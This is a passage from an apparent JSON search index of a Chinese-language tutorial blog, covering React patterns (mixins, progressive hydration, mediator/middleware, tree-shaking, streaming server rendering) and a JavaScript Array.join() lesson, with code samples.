console.log(\u0026#34;卸载!\u0026#34;); }; console.log( \u0026#34;来自 WindowEventHandlers mixin：卸载前\u0026#34;, window.onbeforeunload ); console.log( \u0026#34;来自 WindowEventHandlers mixin：是安全上下文\u0026#34;, window.isSecureContext ); console.log( \u0026#34;WindowEventHandlers 本身未定义\u0026#34;, window.WindowEventHandlers ); console.log( \u0026#34;WindowOrWorkerGlobalScope 本身未定义\u0026#34;, window.WindowOrWorkerGlobalScope ); //来自 WindowEventHandlers mixin：卸载前 f(){} //来自 WindowEventHandlers mixin：是安全上下文 true //WindowEventHandlers 本身未定义 undefined //WindowOrWorkerGlobalScope 本身未定义 undefined   \rReact (ES6之前) 在引入 ES6 类之前，通常使用 Mixin 向 React 组件添加功能。\nReact 团队不鼓励使用 mixin，因为它很容易给组件增加不必要的复杂性，使其难以维护和重用。\nReact 团队鼓励使用高阶组件，现在通常可以用 Hooks 代替。\n\r缺点 Mixins 允许我们通过将功能注入对象的原型，轻松地向对象添加功能而无需继承。\n修改一个对象的原型被视为不好的做法，因为它会导致原型污染和函数来源的一定程度的不确定性。\n\r知识点  Object.assign 用于将所有可枚举属性的值从一个或多个源对象分配到目标对象。它将返回目标对象。  ","description":"向对象或类添加功能而无需继承","id":112,"section":"react-patterns","tags":null,"title":"混合模式（X）","uri":"https://codthing.github.io/react-patterns/design-patterns/mixin-pattern/"},{"content":"简介 服务器呈现的应用程序使用服务器为当前导航生成 HTML。\n一旦服务器完成生成 HTML 内容（其中还包含正确显示静态 UI 所需的 CSS 和 JSON 数据），它就会将数据发送给客户端。\n由于服务器为我们生成了标记，客户端可以快速解析它并将其显示在屏幕上，从而产生快速的 First Contentful Paint！\n尽管服务器渲染提供了更快的首次内容绘制，但它并不总是提供更快的交互时间。\n与我们的网站进行交互所需的 JavaScript 尚未加载。按钮可能看起来是交互式的，但它们还不是交互式的（目前）。\n只有在 JavaScript 包被加载和处理后，处理程序才会被附加。这个过程称为 hydration：React 检查当前的 DOM 节点，并使用相应的 JavaScript 来对节点进行 hydration。\n用户在屏幕上看到非交互式 UI 的时间也被称为恐怖谷：虽然用户可能认为他们可以与网站进行交互，但还没有附加到组件的处理程序。\n这对用户来说可能是一种令人沮丧的体验，因为 UI 可能会像被冻结一样！\n从服务器接收到的 DOM 组件可能需要一段时间才能完全水合。\n在组件可以被水化之前，需要加载、处理和执行 JavaScript 文件。不像我们之前那样一次性对整个应用程序加水，我们还可以逐步对 DOM 节点加水。\n渐进式水合使得随着时间的推移单独水合节点成为可能，这使得仅请求最少必要的 JavaScript 成为可能。\n\r通过逐步补水应用程序，我们可以延迟页面不太重要的部分的补水。\n这样，我们可以减少为了使页面具有交互性而必须请求的 JavaScript 量，并且仅在用户需要时才对节点进行水合。\n渐进式补水还有助于避免最常见的 SSR 补水陷阱，即服务器渲染的 DOM 树被破坏然后立即重建。\n\r渐进式水化允许我们仅根据特定条件对组件进行水化，例如当组件在视口中可见时。\n在下面的示例中，我们有一个用户列表，一旦列表出现在视口中，这些用户列表就会逐渐变水。\n当组件已被水合时，紫色闪烁显示！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  //App.js import React from \u0026#34;react\u0026#34;; import { Hydrator as ClientHydrator, ServerHydrator } from \u0026#34;./Hydrator\u0026#34;; let load = () =\u0026gt; import(\u0026#34;./Stream\u0026#34;); let Hydrator = ClientHydrator; if (typeof window === \u0026#34;undefined\u0026#34;) { Hydrator = ServerHydrator; load = () =\u0026gt; require(\u0026#34;./Stream\u0026#34;); } export default function App() { return ( \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;intro\u0026#34;\u0026gt; \u0026lt;p\u0026gt; This is an example of how server-side rendered React can enable{\u0026#34; \u0026#34;} \u0026lt;strong\u0026gt;progressively hydrated\u0026lt;/strong\u0026gt; experiences. \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;strong\u0026gt;Scroll down.\u0026lt;/strong\u0026gt; The flash of color you see is an indicator of JavaScript being fetched without any direct change to the UI. \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;Hydrator load={load} /\u0026gt; \u0026lt;/div\u0026gt; ); } //client.js import React from \u0026#34;react\u0026#34;; import { hydrate } from \u0026#34;react-dom\u0026#34;; import App from \u0026#34;./components/App\u0026#34;; hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); //server.js import React from \u0026#34;react\u0026#34;; import { renderToNodeStream } from \u0026#34;react-dom/server\u0026#34;; import App from \u0026#34;./components/App\u0026#34;; export default async () =\u0026gt; renderToNodeStream(\u0026lt;App /\u0026gt;);   虽然它发生得很快，但您可以看到初始 UI 与处于水合状态的 UI 相同！\n由于最初的 HTML 包含相同的信息和样式，我们可以无缝地使组件具有交互性，而无需任何华丽或跳跃的 UI。\n渐进式水化可以有条件地使某些组件具有交互性，而您的应用程序用户可能完全不会注意到这一点。\n\r渐进式水化实施 在使用 React 实现 SSR 的部分中，我们讨论了在服务器上呈现的应用程序的客户端水化。\nHydration 允许客户端 React 识别在服务器上呈现的 ReactDOM 组件并将事件附加到这些组件。\n因此，一旦 SSR 应用程序在客户端上可用，它就会为 SSR 应用程序引入连续性和无缝性，使其像 CSR 应用程序一样运行。\n为了让页面上的所有组件通过水化成为可交互的，这些组件的 React 代码应该包含在下载到客户端的包中。\n主要由 JavaScript 控制的高度交互的 SPA 需要一次性完成整个包。\n但是，大多数静态网站在屏幕上具有一些交互式元素，可能不需要所有组件立即处于活动状态。\n对于这样的网站，为屏幕上的每个组件发送一个巨大的 React 包成为一种开销。\nProgressive Hydration 通过允许我们在页面加载时仅对应用程序的某些部分进行水合来解决这个问题。\n其他部分根据需要逐渐水合。\n通过渐进式水合，“您可能还喜欢”和“其他内容”组件可以稍后进行水合。\n水化步骤不是立即初始化整个应用程序，而是从 DOM 树的根部开始，但是服务器渲染的应用程序的各个部分会在一段时间内被激活。\n水合过程可能会因各种分支而停止，并在它们进入视口时或基于某些其他触发器后恢复。\n请注意，执行每个 hydration 所需的资源加载也使用代码拆分技术延迟，从而减少了使页面具有交互性所需的 JavaScript 量。\n渐进式水化背后的想法是通过分块激活您的应用程序来提供出色的性能。\n任何渐进式补水解决方案还应考虑它将如何影响整体用户体验。\n不能让屏幕块一个接一个地弹出，但阻止已经加载的块上的任何活动或用户输入。\n因此，整体渐进式水化实施的要求如下。\n  允许对所有组件使用 SSR\n  支持将代码拆分为单独的组件或块\n  支持在开发人员定义的序列中对这些块进行客户端水合\n  不会阻止用户对已经水合的块进行输入\n  允许对延迟水化的块使用某种加载指示器\n  一旦所有人都可以使用 React 并发模式，它将满足所有这些要求。\n它允许 React 同时处理不同的任务，并根据给定的优先级在它们之间切换。\n切换时，部分渲染的树不需要提交，这样一旦 React 切换回相同的任务，渲染任务就可以继续。\n并发模式可用于实现渐进式水化。\n在这种情况下，页面上每个块的 hydration 成为 React 并发模式的任务。\n如果需要执行用户输入等更高优先级的任务，React 将暂停水化任务并切换到接受用户输入。\n诸如lazy()、Suspense() 等功能允许您使用声明式加载状态。这些可用于在块被延迟加载时显示加载指示器。 SuspenseList() 可用于定义延迟加载组件的优先级。\n这个演示展示了并发模式的作用并实现了渐进式水化。\nReact 并发模式也可以与另一个 React 特性结合使用\n 服务器组件。 这将允许从服务器重新获取组件并在它们流入时在客户端上呈现它们，而不是等待整个获取完成。 因此，即使在我们等待网络获取完成时，客户端的 CPU 也会开始工作。  虽然基于 React 并发模式的渐进式水化实现仍在准备中，但还有许多其他竞争者可以使用部分水化实现。 在 Google I/O \u0026lsquo;19上展示了渐进式补水。 渐进式水化演示展示了如何使用 Hydrator 组件对页面的选定部分进行水化。 对于不同的客户端框架，由此产生了多种实现。 实现也可用于 Vue、Angular 和 Next.js。\n让我们使用 Preact 和 Next.js 快速浏览一个这样的方法\n这 是一个用于部分水合作用的 POC\n  pool-attendant-preact：一个使用 preact x 实现部分水化的库。\n  next-super-performance：一个 Next.js 插件，它使用这个库来提高客户端性能。\n  pool-attendant-preact 库包含一个名为 withHydration 的 API，可标记更具交互性的组件进行水化。\n这些将首先被水化。 您可以使用它来定义您的页面内容，如下所示。\nimport Teaser from \u0026#34;./teaser\u0026#34;;\rimport { withHydration } from \u0026#34;next-super-performance\u0026#34;;\rconst HydratedTeaser = withHydration(Teaser);\rexport default function Body() {\rreturn (\r\u0026lt;main\u0026gt;\r\u0026lt;Teaser column={1} /\u0026gt;\r\u0026lt;HydratedTeaser column={2} /\u0026gt;\r\u0026lt;HydratedTeaser column={3} /\u0026gt;\r\u0026lt;Teaser column={1} /\u0026gt;\r\u0026lt;Teaser column={2} /\u0026gt;\r\u0026lt;Teaser column={3} /\u0026gt;\r\u0026lt;Teaser column={1} /\u0026gt;\r\u0026lt;Teaser column={2} /\u0026gt;\r\u0026lt;Teaser column={3} /\u0026gt;\r\u0026lt;/main\u0026gt;\r);\r} 第 2 列和第 3 列中的组件 HydratedTeaser 将首先水合。\n现在可以使用 hydrate() API 对客户端上的其余组件进行水合，该 API 也包含在库中。\nimport { hydrate } from \u0026#34;next-super-performance\u0026#34;;\rimport Teaser from \u0026#34;./components/teaser\u0026#34;;\rhydrate([Teaser]); 组件 HydrationData 用于将序列化的 props 写入客户端。\n它将确保所需的道具可用于被水合的组件。\nimport Header from \u0026#34;../components/header\u0026#34;;\rimport Main from \u0026#34;../components/main\u0026#34;;\rimport { HydrationData } from \u0026#34;next-super-performance\u0026#34;;\rexport default function Home() {\rreturn (\r\u0026lt;section\u0026gt;\r\u0026lt;Header /\u0026gt;\r\u0026lt;Main /\u0026gt;\r\u0026lt;HydrationData /\u0026gt;\r\u0026lt;/section\u0026gt;\r);\r} \r渐进水合的优缺点 渐进式水化提供服务器端渲染和客户端水化，同时还最大限度地降低了水化成本。\n以下是可以从中获得的一些优势。\n  促进代码拆分：\n代码拆分是渐进式水化的一个组成部分，因为需要为延迟加载的单个组件创建代码块。\n  允许按需加载页面的不常用部分：\n页面的某些组件可能大部分是静态的、在视口之外和/或不需要经常使用。 这些组件是延迟加载的理想选择。 页面加载时不需要发送这些组件的水化代码。 相反，它们可能会根据触发条件进行水合。\n  减少包大小：\n代码拆分自动导致包大小的减少。 加载时执行的代码更少，有助于缩短 FCP 和 TTI 之间的时间。\n  不利的一面是，渐进式补水可能不适合动态应用程序，其中屏幕上的每个元素都可供用户使用，并且需要在加载时进行交互。 这是因为，如果开发人员不知道用户可能首先点击哪里，他们可能无法确定首先要水合的组件。\n\r知识点   Hydration\n  React 并发模式\n  next-super-performance - hydrate HydrationData\n  ","description":"延迟加载页面不太重要的部分的 JavaScript","id":113,"section":"react-patterns","tags":null,"title":"渐进补水 ✔","uri":"https://codthing.github.io/react-patterns/render-patterns/progressive-hydration/"},{"content":"join() 方法通过连接数组（或类似数组的对象）中的所有元素来创建并返回一个新字符串，用逗号或指定的分隔符字符串分隔。 如果数组只有一项，则该项将在不使用分隔符的情况下返回。\n\r使用 join 方法将数组组合成字符串 join 方法用来把数组中的所有元素放入一个字符串。 并通过指定的分隔符参数进行分隔。\n1 2 3  const arr = [\u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34;]; const str = arr.join(\u0026#34; \u0026#34;); // Hello World   在函数 sentensify 内用 join 方法（及其他方法）用字符串 str 中的单词造句，这个函数应返回一个字符串。 该函数应返回一个数组。 举个例子，I-like-Star-Wars 会被转换成 I like Star Wars。 请勿使用 replace 方法。\n1 2 3 4 5 6 7 8  function sentensify(str) { return str.split(/\\W/).join(\u0026#34; \u0026#34;); } sentensify(\u0026#34;May-the-force-be-with-you\u0026#34;); // May the force be with you   \r应用函数式编程将字符串转换为URL片段 许多内容管理站点（CMS）为了让添加书签更简单，会将帖子的标题添加到 URL 上。\n举个例子，如果你写了一篇标题为 Stop Using Reduce 的帖子，URL很可能会包含标题字符串的某种形式 (如：\u0026hellip;/stop-using-reduce)。\n  输入包含空格和标题大小写单词的字符串\n  输出字符串，单词之间的空格用连字符 (-) 替换\n  输出应该是小写字母\n  输出不应有任何空格\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  let globalTitle = \u0026#34;Winter Is Coming\u0026#34;; // function urlSlug(title) { // return title // .toLowerCase() // .trim() // .split(/\\s+/) // .join(\u0026#34;-\u0026#34;); // }  // 或者  function urlSlug(title) { return title .split(\u0026#34; \u0026#34;) .filter(substr =\u0026gt; substr !== \u0026#34;\u0026#34;) .join(\u0026#34;-\u0026#34;) .toLowerCase(); } urlSlug(globalTitle); // winter-is-coming   ","description":"join() 方法通过连接数组（或类似数组的对象）中的所有元素来创建并返回一个新字符串，用逗号或指定的分隔符字符串分隔。 如果数组只有一项，则该项将在不使用分隔符的情况下返回。","id":114,"section":"javascript","tags":null,"title":"Array.prototype.join()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/join-programming/"},{"content":"中介者模式使组件可以通过一个中心点相互交互：中介者（也称中介器或中间件）。\n中介器不是直接相互交谈，而是接收请求，并将它们转发！\n在 JavaScript 中，中介者通常只不过是一个对象字面量或一个函数。\n您可以将此模式与空中交通管制员和飞行员之间的关系进行比较。 飞行员没有直接与彼此交谈，这可能最终会非常混乱，而是与空中交通管制员交谈。 空中交通管制员确保所有飞机都能收到安全飞行所需的信息，而不会撞到其他飞机。\n虽然我们希望不是在 JavaScript 中控制飞机，但我们经常不得不处理对象之间的多向数据。\n如果有大量组件，组件之间的通信会变得相当混乱。\n不让每个对象直接与其他对象对话，导致多对多关系，对象的请求应该由中介处理。\n中介器处理这个请求，并将它转发到它需要的地方。\n\r聊天室案例 中介模式的一个很好的用例是聊天室！ 聊天室中的用户不会直接相互交谈。 相反，聊天室充当用户之间的中介。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  class ChatRoom { logMessage(user, message) { const time = new Date(); const sender = user.getName(); console.log(`${time}[${sender}]: ${message}`); } } class User { constructor(name, chatroom) { this.name = name; this.chatroom = chatroom; } getName() { return this.name; } send(message) { this.chatMediator.logMessage(this, message); } } const chatroom = new ChatRoom(); const user1 = new User(\u0026#34;John Doe\u0026#34;, chatroom); const user2 = new User(\u0026#34;Jane Doe\u0026#34;, chatroom); user1.send(\u0026#34;Hi there!\u0026#34;); // 2021/12/22 06:49:35 [John Doe]: Hi there! user2.send(\u0026#34;Hey!\u0026#34;); // 2021/12/22 06:49:35 [Jane Doe]: Hey!   我们可以创建连接到聊天室的新用户。 每个用户实例都有一个 send 方法，可以使用它来发送消息。\n\r案例分析 Express.js Express.js 是一种流行的 Web 应用程序服务器框架。\n我们可以向用户可以访问的某些路由添加回调。\n假设想在用户点击根“/”时向请求添加一个标头。 我们可以在中间件回调中添加这个标头。\nconst app = require(\u0026#34;express\u0026#34;)();\rapp.use(\u0026#34;/\u0026#34;, (req, res, next) =\u0026gt; {\rreq.headers[\u0026#34;test-header\u0026#34;] = 1234;\rnext();\r}); next 方法调用 请求-响应 循环中的下一个回调。 实际上是在创建一个位于请求和响应之间的中间件函数链，反之亦然。\n让我们添加另一个中间件函数来检查是否正确添加了测试头。 前一个中间件功能添加的更改将在整个链中可见。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  const app = require(\u0026#34;express\u0026#34;)(); app.use( \u0026#34;/\u0026#34;, (req, res, next) =\u0026gt; { req.headers[\u0026#34;test-header\u0026#34;] = 1234; next(); }, (req, res, next) =\u0026gt; { console.log(`Request has test header: ${!!req.headers[\u0026#34;test-header\u0026#34;]}`); // Request has test header: true  next(); } );   Perfect! 我们可以通过一个或多个中间件功能从请求对象一直到响应进行跟踪和修改。\n每次用户点击根端点“/”时，都会调用两个中间件回调。\n\r优点 中间件模式通过让所有通信流经一个中心点，使我们可以轻松地简化对象之间的多对多关系。\n\r知识点  Generator.prototype.next()  返回一个包含属性 done 和 value 的对象。\n该方法也可以通过接受一个参数用以向生成器传值。\n","description":"使用中央中介对象来处理组件之间的通信","id":115,"section":"react-patterns","tags":null,"title":"中介者/中间件模式","uri":"https://codthing.github.io/react-patterns/design-patterns/mediator-pattern/"},{"content":"我们可能会向 bundle 添加代码，而这些代码在应用程序中的任何地方都没有使用。 可以消除这一段死代码，以减少包的大小，并防止不必要地加载更多数据！\n在将死代码添加到包之前消除死代码的过程称为摇树。\n尽管摇树适用于像数学模块这样的简单模块，但在某些情况下摇树可能会很棘手。\n\r概念 摇树旨在从最终的 JavaScript 包中删除永远不会使用的代码。\n如果做得好，它可以减少 JavaScript 包的大小并降低下载、解析和（在某些情况下）执行时间。\n对于大多数使用模块捆绑器（如 webpack 或 Rollup）的现代 JavaScript 应用程序，捆绑器是您期望自动删除死代码的工具。 ⁣⁣\n将应用程序及其依赖项视为抽象语法树（用“摇动”语法树以优化它）。\n树中的每个节点都是为应用程序提供功能的依赖项。\n在 Tree Shaking 中，输入文件被视为图形。\n图中的每个节点都是一个顶级语句，在代码中称为“部分”。\n摇树是从入口点开始的图遍历，并标记任何遍历的路径以供包含。⁣⁣⁣⁣\n每个组件都可以声明符号、引用符号并依赖其他文件。\n甚至“部分”都被标记为是否有副作用。\n例如，语句 let firstName = \u0026lsquo;Jane\u0026rsquo; 没有副作用，因为如果没有任何东西需要 foo，则可以删除该语句而没有任何观察到的差异。\n但是语句 let firstName = getName() 有副作用，因为在不改变代码含义的情况下无法删除对 getName() 的调用，即使没有什么需要 firstName。\n\rImports 只有使用 ES2015 模块语法（导入和导出）定义的模块才能进行 tree-shaken。 导入模块的方式指定模块是否可以摇树。\n摇树首先访问具有副作用的入口点文件的所有部分，然后继续遍历图的边缘，直到到达新的部分。 遍历完成后，JavaScript 包仅包含遍历期间到达的部分。 其他部分被排除在外。 ⁣⁣⁣假设我们定义了以下 utilities.js 文件：⁣⁣⁣⁣\nexport function read(props) {⁣⁣\rreturn props.book⁣⁣\r}⁣⁣\r⁣⁣\rexport function nap(props) {⁣⁣\rreturn props.winks⁣⁣\r} 然后我们就有了下面的 index.js 文件：⁣⁣⁣⁣\nimport { read } from \u0026#39;utilities\u0026#39;;⁣⁣\r⁣⁣\reventHandler = (e) =\u0026gt; {⁣⁣\rread({ book: e.target.value })⁣⁣\r} ⁣⁣ 在这个例子中，nap() 并不重要，因此不会包含在包中。\n\r副作用 当我们导入一个 ES6 模块时，这个模块会立即执行。\n虽然我们没有在代码中的任何地方引用模块的导出，但模块本身在执行时会影响全局范围（例如 polyfill 或全局样式表），这可能会发生。 这称为副作用。 虽然我们没有引用模块本身的导出，但如果模块开始有导出值，由于导入时的特殊行为，模块不能被摇树！\nWebpack 文档对 tree-shaking 以及如何避免破坏它给出了清晰的解释。\n\r知识点  tree shaking 摇树  ","description":"通过消除死代码来减少包大小","id":116,"section":"react-patterns","tags":null,"title":"摇树 tree-shaking","uri":"https://codthing.github.io/react-patterns/performance-patterns/tree-shaking/"},{"content":"我们可以通过流式服务器渲染我们的应用程序的内容来减少服务器渲染我们的应用程序的时间。 我们可以将其拆分为更小的块，而不是生成包含当前导航所需标记的大型 HTML 文件！ 节点流允许我们将数据放入响应对象中，这意味着我们可以不断地将数据向下发送到客户端。 客户端收到数据块的那一刻，它就可以开始呈现内容。\nReact 的内置 renderToNodeStream 使我们可以以更小的块发送我们的应用程序。 由于客户端可以在仍在接收数据时开始绘制 UI，因此我们可以创建非常高性能的首次加载体验。 在接收到的 DOM 节点上调用 hydrate 方法将附加相应的事件处理程序，从而使 UI 具有交互性！\n假设我们有一个应用程序，它在应用程序组件中向用户显示了数千个猫的事实！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116  // src/App.js import React from \u0026#34;react\u0026#34;; import facts from \u0026#34;../data\u0026#34;; const App = () =\u0026gt; facts.map((fact, i) =\u0026gt; ( \u0026lt;div className=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;p key={i}\u0026gt;{fact.fact}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; )); export default App; // src/client.js import React from \u0026#34;react\u0026#34;; import { hydrate } from \u0026#34;react-dom\u0026#34;; import App from \u0026#34;./App\u0026#34;; hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); // src/server.js import React from \u0026#34;react\u0026#34;; import path from \u0026#34;path\u0026#34;; import express from \u0026#34;express\u0026#34;; import { renderToNodeStream } from \u0026#34;react-dom/server\u0026#34;; import App from \u0026#34;./src/App\u0026#34;; const app = express(); app.get(\u0026#34;/favicon.ico\u0026#34;, (req, res) =\u0026gt; res.end()); app.use(\u0026#34;/client.js\u0026#34;, (req, res) =\u0026gt; res.redirect(\u0026#34;/build/client.js\u0026#34;)); const DELAY = 500; app.use((req, res, next) =\u0026gt; { setTimeout(() =\u0026gt; { next(); }, DELAY); }); const BEFORE = ` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Cat Facts\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; defer src=\u0026#34;/build/client.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Stream Rendered Cat Facts!\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;approot\u0026#34;\u0026gt; `.replace(/\\n\\s*/g, \u0026#34;\u0026#34;); app.get(\u0026#34;/\u0026#34;, async (request, response) =\u0026gt; { try { const stream = renderToNodeStream(\u0026lt;App /\u0026gt;); const start = Date.now(); stream.on(\u0026#34;data\u0026#34;, function handleData() { console.log(\u0026#34;Render Start: \u0026#34;, Date.now() - start); stream.off(\u0026#34;data\u0026#34;, handleData); response.useChunkedEncodingByDefault = true; response.writeHead(200, { \u0026#34;content-type\u0026#34;: \u0026#34;text/html\u0026#34;, \u0026#34;content-transfer-encoding\u0026#34;: \u0026#34;chunked\u0026#34;, \u0026#34;x-content-type-options\u0026#34;: \u0026#34;nosniff\u0026#34; }); response.write(BEFORE); response.flushHeaders(); }); await new Promise((resolve, reject) =\u0026gt; { stream.on(\u0026#34;error\u0026#34;, err =\u0026gt; { stream.unpipe(response); reject(err); }); stream.on(\u0026#34;end\u0026#34;, () =\u0026gt; { console.log(\u0026#34;Render End: \u0026#34;, Date.now() - start); response.write(\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); response.end(); resolve(); }); stream.pipe( response, { end: false } ); }); } catch (err) { response.writeHead(500, { \u0026#34;content-type\u0026#34;: \u0026#34;text/pain\u0026#34; }); response.end(String((err \u0026amp;\u0026amp; err.stack) || err)); return; } }); app.use(express.static(path.resolve(__dirname, \u0026#34;src\u0026#34;))); app.use(\u0026#34;/build\u0026#34;, express.static(path.resolve(__dirname, \u0026#34;build\u0026#34;))); const listener = app.listen(process.env.PORT || 2048, () =\u0026gt; { console.log(\u0026#34;Your app is listening on port \u0026#34; + listener.address().port); }); // data.js export default [ { fact: \u0026#34;Tests done by the Behavioral Department of the Musuem of Natural History conclude that while a dog\u0026#39;s memory lasts about 5 minutes, a cat\u0026#39;s recall can last as long as 16 hours.\u0026#34;, length: 175 }, { fact: \u0026#34;Relative to its body size, the clouded leopard has the biggest canines of all animals 2019 canines. Its dagger-like teeth can be as long as 1.8 inches (4.5 cm).\u0026#34;, length: 156 } ]   App 组件使用内置的 renderToNodeStream 方法获取流渲染。 初始 HTML 与来自 App 组件的数据块一起发送到响应对象，\n此数据包含我们的应用程序必须使用的有用信息才能正确呈现内容，例如文档的标题和样式表。\n如果我们使用 renderToString 方法服务器渲染 App 组件，我们将不得不等到应用程序接收到所有数据才能开始加载和处理这些元数据。 为了加快速度，renderToNodeStream 使应用程序可以开始加载和处理此信息，因为它仍在接收来自应用程序组件的数据块！\n 要查看有关如何实施渐进式水化和服务器渲染的更多示例，请访问此 GitHub 存储库。\n  了解 styled-components 如何使用流式渲染来优化样式表的交付。\n \r概念 与渐进式水化一样，流式传输是另一种可用于提高 SSR 性能的渲染机制。\n顾名思义，流式传输意味着 HTML 块在生成时从节点服务器流式传输到客户端。\n由于客户端更早地开始接收 HTML 的“字节”，即使对于大页面，TTFB 也会减少并且相对恒定。\n所有主要浏览器都更早地开始解析和呈现流式内容或部分响应。由于渲染是渐进式的，因此会产生快速的 FP 和 FCP。\n流媒体对网络背压反应良好。\n如果网络堵塞并且无法传输更多字节，渲染器会收到信号并停止流式传输，直到网络清理完毕。\n因此，服务器使用更少的内存并且更能响应 I/O 条件。\n这使您的 Node.js 服务器能够同时呈现多个请求，并防止较重的请求长时间阻塞较轻的请求。\n因此，该站点即使在具有挑战性的条件下也能保持响应。\n\r用于流媒体的 React React 在 2016 年发布的 React 16 中引入了对流的支持。以下 API 包含在 ReactDOMServer 中以支持流。\n  ReactDOMServer.renderToNodeStream(element)：\n此函数的输出 HTML 与 ReactDOMServer.renderToString(element) 相同，但采用 Node.js 可读流格式而不是字符串。 该函数仅适用于服务器以将 HTML 呈现为流。 接收到这个流的客户端可以随后调用 ReactDOM.hydrate() 来水化页面并使其具有交互性。\n  ReactDOMServer.renderToStaticNodeStream(element)：这对应于 ReactDOMServer.renderToStaticMarkup(element)。 HTML 输出是相同的，但采用流格式。 它可用于在服务器上呈现静态、非交互式页面，然后将它们流式传输到客户端。\n  一旦开始读取，这两个函数输出的可读流都可以发出字节。 这可以通过将可读流通过管道传输到可写流（例如响应对象）来实现。 响应对象在等待新数据块被渲染的同时，逐渐向客户端发送数据块。\n综上所述，现在让我们看看这里发布的代码框架。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117  // App.js import React from \u0026#34;react\u0026#34;; import facts from \u0026#34;../data\u0026#34;; const App = () =\u0026gt; facts.map((fact, i) =\u0026gt; ( \u0026lt;div className=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;p key={i}\u0026gt;{fact.fact}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; )); export default App; // src/client.js import React from \u0026#34;react\u0026#34;; import { hydrate } from \u0026#34;react-dom\u0026#34;; import App from \u0026#34;./App\u0026#34;; hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;)); // src/server.js import React from \u0026#34;react\u0026#34;; import path from \u0026#34;path\u0026#34;; import express from \u0026#34;express\u0026#34;; import { renderToNodeStream } from \u0026#34;react-dom/server\u0026#34;; import App from \u0026#34;./src/App\u0026#34;; const app = express(); app.get(\u0026#34;/favicon.ico\u0026#34;, (req, res) =\u0026gt; res.end()); app.use(\u0026#34;/client.js\u0026#34;, (req, res) =\u0026gt; res.redirect(\u0026#34;/build/client.js\u0026#34;)); const DELAY = 500; app.use((req, res, next) =\u0026gt; { setTimeout(() =\u0026gt; { next(); }, DELAY); }); const BEFORE = ` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Cat Facts\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; defer src=\u0026#34;/build/client.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Stream Rendered Cat Facts!\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;approot\u0026#34;\u0026gt; `.replace(/\\n\\s*/g, \u0026#34;\u0026#34;); app.get(\u0026#34;/\u0026#34;, async (request, response) =\u0026gt; { try { const stream = renderToNodeStream(\u0026lt;App /\u0026gt;); const start = Date.now(); stream.on(\u0026#34;data\u0026#34;, function handleData() { console.log(\u0026#34;Render Start: \u0026#34;, Date.now() - start); stream.off(\u0026#34;data\u0026#34;, handleData); response.useChunkedEncodingByDefault = true; response.writeHead(200, { \u0026#34;content-type\u0026#34;: \u0026#34;text/html\u0026#34;, \u0026#34;content-transfer-encoding\u0026#34;: \u0026#34;chunked\u0026#34;, \u0026#34;x-content-type-options\u0026#34;: \u0026#34;nosniff\u0026#34; }); response.write(BEFORE); response.flushHeaders(); }); await new Promise((resolve, reject) =\u0026gt; { stream.on(\u0026#34;error\u0026#34;, err =\u0026gt; { stream.unpipe(response); reject(err); }); stream.on(\u0026#34;end\u0026#34;, () =\u0026gt; { console.log(\u0026#34;Render End: \u0026#34;, Date.now() - start); response.write(\u0026#34;\u0026lt;/div\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); response.end(); resolve(); }); stream.pipe( response, { end: false } ); }); } catch (err) { response.writeHead(500, { \u0026#34;content-type\u0026#34;: 